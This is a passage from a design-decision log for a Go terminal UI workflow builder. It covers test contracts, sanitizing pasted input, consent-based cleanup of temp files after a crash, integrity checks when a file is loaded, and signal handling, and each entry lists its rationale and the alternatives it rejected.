- **Question:** What is the test contract for the new patterns T1 and T2, and for the TUI modes as a whole?
- **Decision:** T1 (atomic save) is covered by unit tests that simulate write failure between temp-file write and rename, asserting the on-disk file is unchanged. T2 (terminal handoff) is covered via an injectable editor-runner interface so external-editor invocation is tested without a real TTY, following the `sandboxCreateDeps` / `sandboxLoginDeps` dependency-injection pattern. Every TUI mode — landing page, edit view, findings panel, unsaved-changes dialog, parse-error recovery view, symlink banner, external-workflow banner, shared-install banner, unknown-field warning — has Bubble Tea model-update tests following the main TUI pattern. Race detector is required (`go test -race`).
- **Rationale:** DevOps Finding 7. Both T1 and T2 are new-to-codebase patterns; without explicit test commitments they ship untested.
- **Evidence:** DevOps-7. DI pattern at `src/cmd/pr9k/sandbox_create.go:19`. Testing standard `docs/coding-standards/testing.md`.
- **Rejected alternatives:**
  - Defer testing to implementation time without commitments.
- **Linked technical notes:** T1, T2
- **Driven by findings:** F45
- **Dependent decisions:** —
- **Referenced in spec:** Testing

## D42: Structured field input sanitization

- **Question:** What happens when the user pastes multi-line or ANSI-escaped content into a single-line input field?
- **Decision:** Newlines and ANSI escape sequences are stripped from pasted input at input time. The field accepts the sanitized remainder. When stripping occurs, a brief "pasted content sanitized" message is shown. Structured fields (step names, model names, prompt paths, script paths) additionally enforce a soft length cap with a visible warning when exceeded.
- **Rationale:** Edge-case 7-A, 7-B, 7-C. An un-sanitized newline in a step name produces a valid-JSON but confusing workflow; ANSI escapes pass through to the log panel and status-line.
- **Evidence:** Edge-case 7-A, 7-B, 7-C. Existing ANSI stripping in sandbox output at `src/cmd/pr9k/sandbox.go:69`.
- **Rejected alternatives:**
  - Preserve all pasted content — creates structural-field corruption.
  - Reject the paste entirely — unhelpful when paste is mostly fine.
- **Linked technical notes:** —
- **Driven by findings:** F31
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 7; Edge Cases table

## D42-a: Crash-era temp file cleanup contract

- **Question:** How and when does the builder clean up a temporary file left by a previous crashed save?
- **Decision:** On opening a target directory, the builder scans for temp files matching its convention (temp-file naming described in T1). If any are found, the builder shows a non-blocking notice naming the file and its modification time, and offers to delete it silently or leave it. Cleanup never happens without user consent; the builder does not auto-delete on load. On save, the temp file created by the previous save attempt (if any) is overwritten cleanly as part of the atomic-rename path.
- **Rationale:** DevOps Finding 3. Silent auto-delete could destroy the evidence of a previous problem; user-consented cleanup keeps diagnosis possible.
- **Evidence:** DevOps-3.
- **Rejected alternatives:**
  - Auto-delete on load.
  - Never clean up.
- **Linked technical notes:** T1
- **Driven by findings:** F42
- **Dependent decisions:** —
- **Referenced in spec:** Alternate Flows — Crash-era temporary file on open

## D43: Load-time integrity checks

- **Question:** What non-fatal integrity issues does the builder surface on load?
- **Decision:** On load, the builder detects and surfaces: UTF-8 BOM presence (strips before parsing, notes in banner); non-UTF-8 encoding (refuses to parse, enters recovery view with encoding note); empty file (enters recovery view with empty-file note); duplicate JSON keys (non-blocking banner listing keys and the winning value); trailing content after the closing `}` (non-blocking banner warning the content will be dropped on save).
- **Rationale:** Edge-case 2-A, 2-C, 2-D, 2-G. Go's JSON decoder is silent about BOM, duplicates, trailing content, and empty files; the builder must not inherit that silence for its primary artifact.
- **Evidence:** Edge-case 2-A, 2-C, 2-D, 2-G.
- **Rejected alternatives:**
  - Treat all as fatal parse errors — noisy for benign cases.
  - Treat all as silent — loses user-visible data.
- **Linked technical notes:** —
- **Driven by findings:** F25
- **Dependent decisions:** —
- **Referenced in spec:** Edge Cases table; Alternate Flows — Parse-error recovery

## D44: Signal handling

- **Question:** How does the builder handle SIGHUP, SIGTSTP, and SIGINT during the session?
- **Decision:** SIGINT received outside of an external-editor invocation triggers the standard quit flow (unsaved-changes confirmation). SIGINT during an external-editor invocation is delivered to the editor's process group; if the editor handles it, the editor exits and control returns. SIGHUP (terminal disconnect) terminates the builder immediately; unsaved changes are lost — documented as a known limitation with `nohup` or terminal-multiplexer as the mitigation. SIGTSTP (Ctrl-Z) releases the terminal back to the shell, suspending the builder; on resume the builder reclaims the terminal and re-renders.
- **Rationale:** Edge-case 9-B, 9-C. Documenting the behavior is more honest than pretending the cases don't exist.
- **Evidence:** Edge-case 9-B, 9-C. Existing signal handling at `docs/features/signal-handling.md`.
- **Rejected alternatives:**
  - Catch SIGHUP and auto-save — risky; a terminal disconnect is often a symptom of a broader problem, and auto-save could write a half-complete state.
  - Refuse to handle SIGTSTP — frustrating for users who expect Ctrl-Z to work.
- **Linked technical notes:** —
- **Driven by findings:** F33
- **Dependent decisions:** —
- **Referenced in spec:** Edge Cases table
